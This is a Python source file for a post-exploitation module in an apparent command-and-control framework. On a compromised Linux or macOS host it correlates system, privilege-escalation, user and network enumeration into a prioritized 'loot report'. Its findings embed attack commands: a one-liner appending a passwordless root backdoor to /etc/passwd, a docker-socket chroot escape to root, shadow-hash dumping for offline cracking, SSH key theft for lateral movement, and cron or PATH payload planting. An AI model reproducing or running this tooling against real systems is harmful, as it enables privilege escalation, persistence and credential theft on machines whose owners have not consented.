"""Unified loot report — correlates findings from all enum modules.

Runs enum/sysinfo, enum/privesc, enum/users, and enum/network in sequence,
then correlates their data into a prioritized, operator-ready findings summary.

Finding priorities
------------------
CRITICAL — Immediate root or reliable shell without further exploitation
HIGH     — Easily exploitable privesc vector or high-value credential exposure
MEDIUM   — Requires extra steps; useful for lateral movement or persistence
LOW      — Situational intelligence: network topology, container hints, etc.

Remote execution note
---------------------
When bundled for remote C2 execution (via ursa_post_dispatch), the sub-module
imports may fail if the beacon environment is minimal.  In that case each
failed module is listed under ``data["module_errors"]`` and the remaining
findings are still returned.  For comprehensive remote loot, dispatch each
enum module individually and run this module locally to correlate.

Platform: Linux, macOS (darwin).
"""

from __future__ import annotations

from post.base import ModuleResult, PostModule
from post.loader import register

# ── Severity constants ─────────────────────────────────────────────────────────

CRITICAL = "CRITICAL"
HIGH     = "HIGH"
MEDIUM   = "MEDIUM"
LOW      = "LOW"

_SEVERITY_ORDER: dict[str, int] = {CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3}


# ── Helpers ────────────────────────────────────────────────────────────────────

def _safe_run(module_name: str) -> tuple[dict, str]:
    """Instantiate and run a post module by name.

    Returns (data_dict, error_str).  error_str is non-empty only when the
    module could not be loaded or returned ok=False.
    """
    try:
        # Local import: avoids circular-import issues when loot.py is bundled
        # for remote C2 execution (post.loader may not be available).
        from post.loader import _REGISTRY, PostLoader  # noqa: PLC0415

        PostLoader._discover()
        if module_name not in _REGISTRY:
            return {}, f"module not registered: {module_name!r}"
        result = _REGISTRY[module_name]().run({})
        if not result.ok:
            return result.data, result.error or f"{module_name} returned ok=False"
        return result.data, ""
    except Exception as exc:  # noqa: BLE001
        return {}, f"{type(exc).__name__}: {exc}"


def _finding(severity: str, category: str, title: str, detail: str = "") -> dict:
    """Create a structured finding dict."""
    return {
        "severity": severity,
        "category": category,
        "title": title,
        "detail": detail,
    }


# ── Correlation logic ──────────────────────────────────────────────────────────

def _correlate(
    sysinfo: dict,
    privesc: dict,
    users: dict,
    network: dict,
) -> list[dict]:
    """Produce a sorted list of finding dicts from the four enum module data dicts.

    Each argument is the ``data`` dict returned by the corresponding enum module.
    Missing or empty dicts produce no findings for that module — graceful degradation.
    """
    findings: list[dict] = []
    add = findings.append

    cur = users.get("current_user", {})
    env = sysinfo.get("env", {})          # sysinfo filtered env (dict of str→str)
    sp  = privesc.get("shadow_passwd", {})
    docker = privesc.get("docker", {})
    sudo   = privesc.get("sudo", {})
    suid   = privesc.get("suid_sgid", {})
    privesc_env = privesc.get("env", {})  # privesc dangerous-env check result

    # ── CRITICAL ──────────────────────────────────────────────────────────────

    if cur.get("is_root"):
        add(_finding(
            CRITICAL, "identity",
            "Running as root (uid=0)",
            "Full system access — skip privesc, proceed directly to persistence/exfil.",
        ))

    if sp.get("shadow_readable"):
        add(_finding(
            CRITICAL, "credentials",
            "/etc/shadow is readable",
            "Dump hashes: `cat /etc/shadow`; crack offline with hashcat/john.",
        ))

    if sp.get("passwd_writable"):
        add(_finding(
            CRITICAL, "privesc",
            "/etc/passwd is writable",
            "Add backdoor root account: "
            "`echo 'r00t::0:0::/root:/bin/bash' >> /etc/passwd`",
        ))

    if docker.get("exploitable"):
        add(_finding(
            CRITICAL, "privesc",
            "Docker socket is writable (/var/run/docker.sock)",
            "Escape to root: "
            "`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`",
        ))

    # ── HIGH ──────────────────────────────────────────────────────────────────

    readable_keys = [
        f["path"]
        for entry in users.get("ssh_keys", [])
        for f in entry.get("files", [])
        if f.get("is_private_key") and f.get("readable")
    ]
    if readable_keys:
        key_list = ", ".join(readable_keys[:5])
        suffix = f" (+{len(readable_keys) - 5} more)" if len(readable_keys) > 5 else ""
        add(_finding(
            HIGH, "credentials",
            f"Readable private SSH keys ({len(readable_keys)} found)",
            f"Keys: {key_list}{suffix} — copy for lateral movement.",
        ))

    if sudo.get("has_nopasswd"):
        entries = "; ".join(sudo.get("nopasswd_entries", [])[:3])
        add(_finding(
            HIGH, "privesc",
            "Sudo NOPASSWD entries found",
            f"Entries: {entries}",
        ))

    gtfo_hits = suid.get("gtfobins_hits", [])
    if gtfo_hits:
        bins = ", ".join(gtfo_hits[:5])
        suffix = f" (+{len(gtfo_hits) - 5} more)" if len(gtfo_hits) > 5 else ""
        add(_finding(
            HIGH, "privesc",
            f"GTFOBins SUID binaries ({len(gtfo_hits)} found)",
            f"Binaries: {bins}{suffix} — see gtfobins.github.io for exploit steps.",
        ))

    if cur.get("in_docker_group"):
        add(_finding(
            HIGH, "privesc",
            "Current user is in the docker group (root-equivalent)",
            "Escape to root: "
            "`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`",
        ))

    if "AWS_ACCESS_KEY_ID" in env:
        key_prefix = env.get("AWS_ACCESS_KEY_ID", "")[:8]
        add(_finding(
            HIGH, "credentials",
            "AWS credentials found in environment",
            f"Key ID prefix: {key_prefix}... — "
            "run `aws iam get-caller-identity` to enumerate.",
        ))

    if "KUBECONFIG" in env:
        add(_finding(
            HIGH, "credentials",
            "KUBECONFIG found in environment",
            f"Path: {env.get('KUBECONFIG')} — "
            "run `kubectl get pods --all-namespaces` to enumerate cluster.",
        ))

    if cur.get("in_sudo_group"):
        add(_finding(
            HIGH, "privesc",
            "User is in sudo/wheel/admin group",
            "May sudo with password — try `sudo -l` or `sudo su -`.",
        ))

    if env.get("DOCKER_HOST"):
        add(_finding(
            HIGH, "credentials",
            "DOCKER_HOST set — remote Docker daemon accessible",
            f"Socket: {env.get('DOCKER_HOST')} — may allow root container escape.",
        ))

    # ── MEDIUM ────────────────────────────────────────────────────────────────

    writable_cron = privesc.get("writable_cron", {}).get("writable_cron_paths", [])
    if writable_cron:
        paths = ", ".join(writable_cron[:3])
        add(_finding(
            MEDIUM, "privesc",
            f"Writable cron paths ({len(writable_cron)} found)",
            f"Paths: {paths} — append payload to execute as root on schedule.",
        ))

    writable_path_dirs = privesc.get("writable_path", {}).get("writable", [])
    if writable_path_dirs:
        dirs = ", ".join(writable_path_dirs[:3])
        add(_finding(
            MEDIUM, "privesc",
            f"Writable directories in $PATH ({len(writable_path_dirs)} found)",
            f"Dirs: {dirs} — plant malicious binary for PATH hijacking.",
        ))

    interesting_caps = privesc.get("capabilities", {}).get("interesting", [])
    if interesting_caps:
        caps = "; ".join(interesting_caps[:3])
        add(_finding(
            MEDIUM, "privesc",
            f"Interesting Linux capabilities ({len(interesting_caps)} binaries)",
            f"Caps: {caps}",
        ))

    nfs_entries = privesc.get("nfs", {}).get("no_root_squash_entries", [])
    if nfs_entries:
        exports = ", ".join(nfs_entries[:2])
        add(_finding(
            MEDIUM, "privesc",
            f"NFS no_root_squash exports ({len(nfs_entries)} found)",
            f"Exports: {exports} — mount from attacker box and exploit SUID.",
        ))

    dangerous_env = privesc_env.get("dangerous_env", {})
    if dangerous_env:
        vars_list = ", ".join(dangerous_env.keys())
        add(_finding(
            MEDIUM, "environment",
            f"Dangerous environment variables set ({len(dangerous_env)})",
            f"Vars: {vars_list} — may allow library/script injection.",
        ))

    container_hints = sysinfo.get("container_vm_hints", [])
    if container_hints:
        hints = "; ".join(str(h) for h in container_hints[:3])
        add(_finding(
            MEDIUM, "environment",
            f"Container/VM environment detected ({len(container_hints)} hints)",
            f"Hints: {hints}",
        ))

    # ── LOW ───────────────────────────────────────────────────────────────────

    internal_hosts = network.get("internal_hosts_seen", [])
    if internal_hosts:
        hosts = ", ".join(internal_hosts[:8])
        suffix = f" (+{len(internal_hosts) - 8} more)" if len(internal_hosts) > 8 else ""
        add(_finding(
            LOW, "network",
            f"Internal hosts visible in ARP/routes ({len(internal_hosts)} hosts)",
            f"Hosts: {hosts}{suffix} — potential lateral movement targets.",
        ))

    _loopback = {"127.0.0.1", "::1", "[::1]", "lo"}
    non_loopback_ports = [
        p for p in network.get("listening_ports", [])
        if p.get("local_addr", "") not in _loopback and p.get("local_addr", "")
    ]
    if non_loopback_ports:
        port_strs = [f"{p['proto']}:{p['port']}" for p in non_loopback_ports[:6]]
        suffix = f" (+{len(non_loopback_ports) - 6} more)" if len(non_loopback_ports) > 6 else ""
        add(_finding(
            LOW, "network",
            f"Non-loopback listening services ({len(non_loopback_ports)} ports)",
            f"Ports: {', '.join(port_strs)}{suffix}",
        ))

    active_sessions = users.get("active_sessions", "")
    if active_sessions and not active_sessions.startswith("[error"):
        session_lines = [ln for ln in active_sessions.splitlines() if ln.strip()]
        if session_lines:
            add(_finding(
                LOW, "network",
                f"Active user sessions ({len(session_lines)})",
                f"Sessions: {'; '.join(session_lines[:3])}",
            ))

    # Sort: CRITICAL first, then HIGH, MEDIUM, LOW; alphabetical within tier
    findings.sort(key=lambda f: (_SEVERITY_ORDER.get(f["severity"], 9), f["title"]))
    return findings


# ── Module ─────────────────────────────────────────────────────────────────────

@register
class LootModule(PostModule):
    NAME = "enum/loot"
    DESCRIPTION = (
        "Unified loot report: runs sysinfo, privesc, users, network "
        "and correlates findings into a prioritized CRITICAL/HIGH/MEDIUM/LOW summary"
    )
    PLATFORM    = ["linux", "darwin"]
    IMPLEMENTED = True

    def run(self, args: dict | None = None) -> ModuleResult:  # noqa: ARG002
        # ── Run all four enum modules ─────────────────────────────────────────
        module_data:   dict[str, dict] = {}
        module_errors: dict[str, str]  = {}

        for name in ("enum/sysinfo", "enum/privesc", "enum/users", "enum/network"):
            data, err = _safe_run(name)
            module_data[name] = data
            if err:
                module_errors[name] = err

        sysinfo = module_data.get("enum/sysinfo", {})
        privesc = module_data.get("enum/privesc", {})
        users   = module_data.get("enum/users",   {})
        network = module_data.get("enum/network", {})

        # ── Correlate ─────────────────────────────────────────────────────────
        findings = _correlate(sysinfo, privesc, users, network)

        # ── Build human-readable output ───────────────────────────────────────
        cur      = users.get("current_user", {})
        hostname = sysinfo.get("hostname") or network.get("hostname", "?")
        os_str   = f"{sysinfo.get('os', '')} {sysinfo.get('os_release', '')}".strip()

        counts = {
            CRITICAL: sum(1 for f in findings if f["severity"] == CRITICAL),
            HIGH:     sum(1 for f in findings if f["severity"] == HIGH),
            MEDIUM:   sum(1 for f in findings if f["severity"] == MEDIUM),
            LOW:      sum(1 for f in findings if f["severity"] == LOW),
        }
        total = len(findings)
        count_str = (
            f"{counts[CRITICAL]}C / {counts[HIGH]}H / "
            f"{counts[MEDIUM]}M / {counts[LOW]}L"
        )

        header = [
            "=" * 64,
            f"  LOOT REPORT — {hostname}",
            f"  User   : {cur.get('username', '?')} (uid={cur.get('uid', '?')})",
            f"  OS     : {os_str or '?'}",
            f"  Modules: {len(module_data)} run, {len(module_errors)} errors",
            f"  Findings: {total} total  [{count_str}]",
            "=" * 64,
        ]

        body: list[str] = []
        for sev, label in [
            (CRITICAL, "■ CRITICAL"),
            (HIGH,     "■ HIGH"),
            (MEDIUM,   "■ MEDIUM"),
            (LOW,      "■ LOW"),
        ]:
            tier = [f for f in findings if f["severity"] == sev]
            if not tier:
                continue
            body.append(f"\n{label} ({len(tier)})")
            body.append("-" * 40)
            for f in tier:
                body.append(f"  [{f['category']}] {f['title']}")
                if f["detail"]:
                    body.append(f"    → {f['detail']}")

        if not findings:
            body.append("\n  No significant findings detected.")

        if module_errors:
            body.append("\n⚠ Module errors (partial results):")
            for mod, err in module_errors.items():
                body.append(f"  {mod}: {err}")

        output = "\n".join(header + body)

        return ModuleResult(
            ok=True,
            output=output,
            data={
                "hostname":      hostname,
                "username":      cur.get("username", ""),
                "uid":           cur.get("uid"),
                "os":            os_str,
                "findings":      findings,
                "finding_counts": counts,
                "module_errors": module_errors,
                "raw": {
                    "sysinfo": sysinfo,
                    "privesc": privesc,
                    "users":   users,
                    "network": network,
                },
            },
        )
